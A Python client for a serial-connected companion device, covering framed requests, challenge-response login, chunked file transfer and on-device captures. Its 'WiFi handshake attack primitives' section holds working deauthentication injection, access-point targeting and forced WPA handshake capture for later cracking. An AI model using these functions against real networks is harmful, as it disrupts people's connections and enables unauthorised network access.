#!/usr/bin/env python3
"""Companion wire-protocol v1 client (USB-CDC).

Reference implementation of docs/companion/protocol.md, used to validate the
Phase 1 firmware. Frame format (one frame per line, '\\n'-terminated):

    <TYPE> <ID> <PAYLOAD...>

TYPE in {REQ, RSP, END, ERR, EVT, ACK}.  A request collects RSP lines until a
matching END (success) or ERR (failure).
"""
import time
import base64
import hashlib
import itertools
from dataclasses import dataclass, field

import serial  # pyserial


KNOWN_TYPES = {"REQ", "RSP", "END", "ERR", "EVT", "ACK"}


def auth_digest(token: str, nonce: str) -> str:
    """Challenge-response proof: sha256("<token>:<nonceHex>"). Must match the
    firmware (companion.cpp sha256Hex). The token never crosses the link."""
    return hashlib.sha256(f"{token}:{nonce}".encode()).hexdigest()


def _kv(lines) -> dict:
    """Collect all key=value tokens from a list of RSP payload strings. The first
    occurrence of a key wins is NOT enforced — later tokens overwrite earlier, so
    pass the most specific line last (capture stop RSP is single-line anyway)."""
    info = {}
    for line in lines:
        for tok in line.split():
            if "=" in tok:
                k, v = tok.split("=", 1)
                info[k] = v
    return info


def _kv_from_resp(resp) -> dict:
    """Collect all key=value tokens from a Response's RSP lines."""
    info = _kv(resp.lines)
    if "caps" in info:
        info["caps"] = info["caps"].split(",")
    return info


@dataclass
class Frame:
    type: str       # one of KNOWN_TYPES, or "RAW" for non-frame passthrough lines
    id: int
    payload: str

    @classmethod
    def parse(cls, line: str):
        line = line.rstrip("\r\n")
        if not line:
            return None
        parts = line.split(" ", 2)
        # A real frame is "<KNOWN> <int> [payload]". Anything else is RAW output
        # (e.g. a command or deep module that still writes to bare Serial).
        if len(parts) >= 2 and parts[0] in KNOWN_TYPES:
            try:
                fid = int(parts[1])
                payload = parts[2] if len(parts) > 2 else ""
                return cls(parts[0], fid, payload)
            except ValueError:
                pass
        return cls("RAW", 0, line)


@dataclass
class Response:
    id: int
    ok: bool
    code: int
    lines: list = field(default_factory=list)   # RSP payloads
    events: list = field(default_factory=list)   # EVT payloads seen during the request
    error: str = ""


class Companion:
    def __init__(self, port="/dev/ttyACM1", baud=115200, debug=False):
        self.ser = serial.Serial(port, baud, timeout=0.1)
        self.debug = debug
        self._ids = itertools.count(1)
        self._rxbuf = bytearray()
        time.sleep(0.4)
        self.ser.reset_input_buffer()

    def close(self):
        self.ser.close()

    # --- low level ---
    def _read_frames(self, deadline):
        """Yield Frames as they arrive until deadline."""
        while time.time() < deadline:
            chunk = self.ser.read(512)
            if chunk:
                self._rxbuf += chunk
                while b"\n" in self._rxbuf:
                    raw, _, self._rxbuf = self._rxbuf.partition(b"\n")
                    line = raw.decode(errors="replace")
                    if self.debug:
                        print(f"  << {line!r}")
                    fr = Frame.parse(line)
                    if fr:
                        yield fr
            else:
                time.sleep(0.01)

    def request(self, cmd: str, timeout=4.0) -> Response:
        rid = next(self._ids)
        frame = f"REQ {rid} {cmd}\n"
        if self.debug:
            print(f"  >> {frame!r}")
        self.ser.write(frame.encode())
        self.ser.flush()
        resp = Response(id=rid, ok=False, code=-1)
        deadline = time.time() + timeout
        for fr in self._read_frames(deadline):
            if fr.type == "RAW":
                # Unframed passthrough line (e.g. a command writing to bare
                # Serial). Attribute it to the in-flight request.
                resp.lines.append(fr.payload)
                continue
            if fr.id != rid and fr.type in ("RSP", "END", "ERR"):
                continue  # not ours (legacy noise / other request)
            if fr.type == "RSP":
                resp.lines.append(fr.payload)
            elif fr.type == "EVT":
                resp.events.append(fr.payload)
            elif fr.type == "END":
                resp.ok = True
                try:
                    resp.code = int(fr.payload.strip().split()[0])
                except (ValueError, IndexError):
                    resp.code = 0
                return resp
            elif fr.type == "ERR":
                resp.ok = False
                resp.error = fr.payload
                try:
                    resp.code = int(fr.payload.strip().split()[0])
                except (ValueError, IndexError):
                    resp.code = -1
                return resp
        resp.error = "timeout"
        return resp

    def hello(self, token="", timeout=4.0) -> dict:
        return hello_via(self.request, token, timeout)

    # --- file transfer (chunked base64 + sha256) ---
    def file_get(self, remote_path, local_path=None, chunk=512, timeout=60):
        """Download a file from the device. Returns dict(size, sha256, data[, path])."""
        return file_get_via(self.request, remote_path, local_path, chunk, timeout)

    def file_put(self, local_path, remote_path, chunk=512, timeout=60):
        """Upload a file to the device. Returns dict(ok, sha256, lines)."""
        return file_put_via(self.request, local_path, remote_path, chunk, timeout)

    # --- async streaming ---
    def stream(self, kind="telemetry", duration=5.0, max_events=None):
        """Start a stream, collect EVT frames for `duration`s, then stop.
        Returns dict(start, events)."""
        r = self.request(f"companion stream start {kind}", timeout=4.0)
        if not r.ok:
            raise RuntimeError(f"stream start failed: {r.error or r.lines}")
        rid = r.id
        events = []
        deadline = time.time() + duration
        for fr in self._read_frames(deadline):
            if fr.type == "EVT" and fr.id == rid:
                events.append(fr.payload)
                if max_events and len(events) >= max_events:
                    break
        self.request(f"companion stream stop {rid}", timeout=4.0)
        return {"start": r.lines, "events": events}

    # --- capture-to-file (device logs sweeps to SD; survives disconnect) ---
    def capture_start(self, kind="telemetry", path="", interval=None):
        spec = kind
        if interval:
            spec += f" interval={int(interval)}"
        if path:
            spec += f" path={path}"
        return self.request(f"companion capture start {spec}", timeout=6.0)

    def capture_status(self, timeout=4.0):
        return self.request("companion capture status", timeout=timeout)

    def capture_stop(self, timeout=8.0):
        return self.request("companion capture stop", timeout=timeout)

    def capture(self, kind="telemetry", duration=10.0, path="", interval=None):
        """Start a capture, let it run on-device for `duration`s (collecting any
        progress EVTs), then stop. Returns dict(path, bytes, samples, sha256,
        progress[]). The data stays on the device — call file_get(path) to fetch."""
        r = self.capture_start(kind, path, interval)
        if not r.ok:
            raise RuntimeError(f"capture start failed: {r.error or r.lines}")
        rid = r.id
        meta = _kv(r.lines)
        prog = []
        deadline = time.time() + duration
        for fr in self._read_frames(deadline):
            if fr.type == "EVT" and fr.id == rid:
                prog.append(fr.payload)
        s = self.capture_stop()
        if not s.ok:
            raise RuntimeError(f"capture stop failed: {s.error or s.lines}")
        sm = _kv(s.lines)
        return {
            "path": sm.get("path") or meta.get("path", ""),
            "bytes": int(sm.get("bytes", 0)),
            "samples": int(sm.get("samples", 0)),
            "sha256": sm.get("sha256", ""),
            "kind": kind,
            "progress": prog,
        }

    def capture_fetch(self, kind="telemetry", duration=10.0, local_path=None,
                      path="", interval=None):
        """capture() + download the resulting file. Returns the capture dict with
        an added 'local' path and a 'verified' bool (device sha256 vs fetched)."""
        cap = self.capture(kind, duration, path, interval)
        if not cap["path"]:
            raise RuntimeError("capture produced no path")
        got = self.file_get(cap["path"], local_path)
        cap["local"] = got.get("path") or local_path
        cap["verified"] = bool(cap["sha256"]) and got.get("sha256", "") == cap["sha256"]
        return cap

    # --- WiFi handshake attack primitives -------------------------------------
    def deauth(self, bssid, sta="broadcast", ch=0, count=8, timeout=8.0):
        """Inject deauth frames to knock a client off `bssid` (forces a re-auth →
        fresh 4-way handshake). sta='broadcast' hits all clients."""
        spec = f"companion wifi deauth bssid={bssid}"
        if sta and sta != "broadcast":
            spec += f" sta={sta}"
        if ch:
            spec += f" ch={ch}"
        spec += f" count={count}"
        return self.request(spec, timeout=timeout)

    def scan_aps(self, scan_secs=6.0, rounds=1):
        """Scan 2.4 GHz and return a de-duplicated AP list sorted by signal:
        [{bssid, ch, ssid, rssi, enc}], strongest first."""
        seen = {}
        for _ in range(max(1, rounds)):
            out = self.stream("wifi", duration=scan_secs)
            for e in out["events"]:
                if not e.startswith("wifi net") or " ssid=" not in e:
                    continue
                name = e[e.find(" ssid=") + 6:]
                d = dict(t.split("=", 1) for t in e.split()
                         if "=" in t and not t.startswith("ssid="))
                b = d.get("bssid", "")
                if not b:
                    continue
                rs = d.get("rssi", "")
                rssi = int(rs) if rs.lstrip("-").isdigit() else -999
                cur = seen.get(b)
                if cur is None or rssi > cur["rssi"]:
                    ch = d.get("ch", "")
                    seen[b] = {"bssid": b, "ch": int(ch) if ch.isdigit() else 0,
                               "ssid": name, "rssi": rssi, "enc": d.get("enc", "?")}
        return sorted(seen.values(), key=lambda a: a["rssi"], reverse=True)

    def find_ap(self, ssid, scan_secs=4.0):
        """Scan (via the wifi stream) for an AP by SSID. Returns
        {bssid, ch, ssid, rssi} or None."""
        out = self.stream("wifi", duration=scan_secs)
        best = None
        for e in out["events"]:
            if not e.startswith("wifi net") or " ssid=" not in e:
                continue
            name = e[e.find(" ssid=") + 6:]            # SSID is the line tail (may have spaces)
            if name != ssid:
                continue
            d = dict(t.split("=", 1) for t in e.split() if "=" in t and not t.startswith("ssid="))
            rssi = int(d.get("rssi", -999))
            if best is None or rssi > best["rssi"]:
                best = {"bssid": d.get("bssid", ""), "ch": int(d.get("ch", 0)),
                        "ssid": name, "rssi": rssi}
        return best

    def capture_handshake(self, bssid="", ch=0, secs=20.0, deauth_count=8, rounds=3,
                          local_path=None):
        """Start a handshake (pcap) capture, fire `rounds` deauth bursts spread over
        `secs` to elicit the handshake, then stop + fetch. Returns the capture dict
        (path/bytes/samples/sha256/local/verified)."""
        kind = "handshake"
        if ch:
            kind += f" ch={ch}"
        if bssid:
            kind += f" bssid={bssid}"
        r = self.capture_start(kind)
        if not r.ok:
            raise RuntimeError(f"handshake capture start failed: {r.error or r.lines}")
        rid = r.id
        rounds = max(1, rounds)
        slice_s = secs / rounds
        for i in range(rounds):
            if bssid and deauth_count:
                self.deauth(bssid, ch=ch, count=deauth_count)
            end = time.time() + slice_s
            for fr in self._read_frames(end):   # drain progress EVTs; file logs on-device
                if fr.type == "EVT" and fr.id == rid:
                    pass
        s = self.capture_stop()
        if not s.ok:
            raise RuntimeError(f"handshake capture stop failed: {s.error or s.lines}")
        sm = _kv(s.lines)
        cap = {"path": sm.get("path", ""), "bytes": int(sm.get("bytes", 0)),
               "samples": int(sm.get("samples", 0)), "sha256": sm.get("sha256", ""),
               "kind": "handshake"}
        if cap["path"]:
            got = self.file_get(cap["path"], local_path)
            cap["local"] = got.get("path") or local_path
            cap["verified"] = bool(cap["sha256"]) and got.get("sha256", "") == cap["sha256"]
        return cap


# --- transport-agnostic HELLO + challenge-response auth ---
def hello_via(request, token="", timeout=6.0) -> dict:
    """HELLO handshake with challenge-response. `request` is callable(cmd, timeout).

    Open mode (USB, no token configured) authenticates in one step. If the device
    replies auth=required, we answer the nonce with AUTH resp=sha256(token:nonce).
    Returns an info dict (fw/board/mtu/caps/...) with ok/raw[/error]."""
    r = request("HELLO proto=1", timeout)
    info = _kv_from_resp(r)
    info["ok"] = r.ok and r.code == 0
    info["raw"] = r
    if not info["ok"]:
        info["error"] = r.error
        return info
    if info.get("auth") == "required":
        nonce = info.get("nonce")
        if not nonce:
            info["ok"] = False
            info["error"] = "no nonce in challenge"
            return info
        r2 = request(f"AUTH resp={auth_digest(token, nonce)}", timeout)
        info2 = _kv_from_resp(r2)
        info["ok"] = r2.ok and r2.code == 0
        info["raw"] = r2
        if "caps" in info2:
            info["caps"] = info2["caps"]
        if not info["ok"]:
            info["error"] = r2.error or "AUTH rejected"
    return info


# --- transport-agnostic file transfer; `request` is callable(cmd, timeout)->Response ---
def file_get_via(request, remote_path, local_path=None, chunk=512, timeout=60):
    r = request(f"companion file get {remote_path} chunk={chunk}", timeout)
    if not r.ok or r.code != 0:
        raise RuntimeError(f"file get failed: {r.error or r.lines}")
    sha_expected = None
    for line in r.lines:
        for tok in line.split():
            if tok.startswith("sha256="):
                sha_expected = tok[len("sha256="):]
    chunks = {}
    for ev in r.events:
        parts = ev.split(" ", 2)  # "chunk <n> <b64>"
        if len(parts) == 3 and parts[0] == "chunk":
            chunks[int(parts[1])] = parts[2]
    data = b"".join(base64.b64decode(chunks[i]) for i in sorted(chunks))
    got = hashlib.sha256(data).hexdigest()
    if sha_expected and got.lower() != sha_expected.lower():
        raise RuntimeError(f"sha256 mismatch: {got} != {sha_expected}")
    out = {"size": len(data), "sha256": got, "data": data}
    if local_path:
        with open(local_path, "wb") as fh:
            fh.write(data)
        out["path"] = local_path
    return out


def file_put_via(request, local_path, remote_path, chunk=512, timeout=60):
    with open(local_path, "rb") as fh:
        data = fh.read()
    sha = hashlib.sha256(data).hexdigest()
    r = request(f"companion file put {remote_path} size={len(data)} sha256={sha} chunk={chunk}", timeout)
    if not r.ok or r.code != 0:
        raise RuntimeError(f"put start failed: {r.error or r.lines}")
    cs = chunk
    for line in r.lines:
        for tok in line.split():
            if tok.startswith("chunk_size="):
                cs = int(tok[len("chunk_size="):])
    n = 0
    for i in range(0, len(data), cs):
        b64 = base64.b64encode(data[i:i + cs]).decode()
        rr = request(f"companion file putchunk {n} {b64}", timeout)
        if not rr.ok or rr.code != 0:
            raise RuntimeError(f"putchunk {n} failed: {rr.error or rr.code}")
        n += 1
    end = request("companion file putend", timeout)
    return {"ok": end.ok and end.code == 0, "sha256": sha, "lines": end.lines}
